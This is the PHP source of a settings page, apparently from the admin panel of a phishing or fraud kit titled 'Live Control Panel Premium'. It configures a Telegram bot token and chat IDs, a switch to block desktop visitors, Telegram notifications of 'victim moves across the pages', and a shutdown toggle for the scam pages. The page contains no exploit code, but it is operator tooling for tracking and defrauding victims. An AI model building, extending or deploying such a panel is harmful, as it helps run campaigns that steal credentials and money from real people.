<?php 
require "classes/Jeehan.class.php";

if(!isset($_SESSION['user']) OR $_SESSION['user']==""){
	exit(header("location: login.php"));
}

 
$j = new Jeehan();


?>
<!doctype html>
<html>
<head>
<title>Settings</title>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0">
<link rel="stylesheet" href="res/app.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css"/>
<script src="res/jq.js"></script>
</head>
<body>
<div class="header">
<div class="left">
<i class='fa fa-user'></i> Welcome, <b> <?php echo substr(PNL_USERNAME, 0, 8);?></b>
</div>
<div class="right">
<button onclick="window.location='index.php';"><i class='fa fa-home'></i> Home </button>
<button onclick="window.location='settings.php';"><i class='fa fa-home'></i>Settings </button>
<button onclick="logout()"class="ban"><i class='fa fa-lock'></i> Log out</button>
</div>
</div>
<div class="content">
<div class="holder">
<form action="update.php" method="post">
<div class="multi">
 
<?php
if(isset($_GET['update']) and $_GET['update']=='success'){
echo "<h3 style='color:green;'>Data updated successfully!</h3>";
}
?>


<div class="box">
<div class="title">TELEGRAM BOT</div>
<div class="content">
<div class="input">
<input type="text" name="bot_token" id="bot-token" required placeholder="Telegram Bot Token" value="<?php echo $j->getAdmin("telegram_bot"); ?>">
<input type="hidden" name="update" value="1">
</div>
<div class="input">
<input type="text" name="chat_id" id="bot-token" required placeholder="Chat Ids. example:  837639720, -38729386, 662529192...." 
value="<?php echo $j->getAdmin("chat_id"); ?>">
</div>
</div>
</div>
<div class="box">
<div class="title">Pc Devices Block</div>
<div class="content">
<div class="input">
<p>Block pc devices? if you selected Yes then only mobiles will access to the pages.</p>
<label><input type="radio" name="block_pc" required  value="1" <?php if($j->getAdmin("block_pc")==1){echo "checked";} ?> > Yes</label>
<label><input type="radio" name="block_pc" required value="0" <?php if($j->getAdmin("block_pc")==0){echo "checked";} ?>> No</label>
</div>
</div>
</div>

<div class="box">
<div class="title">Telegram Notifications</div>
<div class="content">
<div class="input">
<p>You want to receive notifications of victim moves across the pages?</p>
<label><input type="radio" name="notifications" required  value="1" <?php if($j->getAdmin("notifications")==1){echo "checked";} ?>> Yes</label>
<label><input type="radio" name="notifications" required  value="0" <?php if($j->getAdmin("notifications")==0){echo "checked";} ?>> No</label>
</div>
</div>
</div>


<div class="box">
<div class="title">Shut down</div>
<div class="content">
<div class="input">
<p>If you selected Yes then all pages won't be accessible until you select No again.</p>
<label><input type="radio" name="shutdown"  required value="1" <?php if($j->getAdmin("shutdown")==1){echo "checked";} ?>> Yes</label>
<label><input type="radio" name="shutdown" required  value="0" <?php if($j->getAdmin("shutdown")==0){echo "checked";} ?>> No</label>
</div>
</div>
</div>

</div>
<button style="margin:10px;">Save Changes </button>
</form>
</div>

 </div>

<div class="footer">
<div class="info">Live Control Panel Premium</div>
</div>
<script>
 
 

function showError(msg){
	$(".loader").hide();
	$(".loader-error").hide();
	$("#error-msg").html(msg);
	 $("#errorbox").show().delay(2000).fadeOut();
}
function showSuccess(msg){
	$(".loader").hide();
	$(".loader-error").hide();
	$("#success-msg").html(msg);
	 $("#successbox").show().delay(2000).fadeOut();
}
 


function logout(){
	window.location="index.php?logout";
}

</script>
</body>
</html>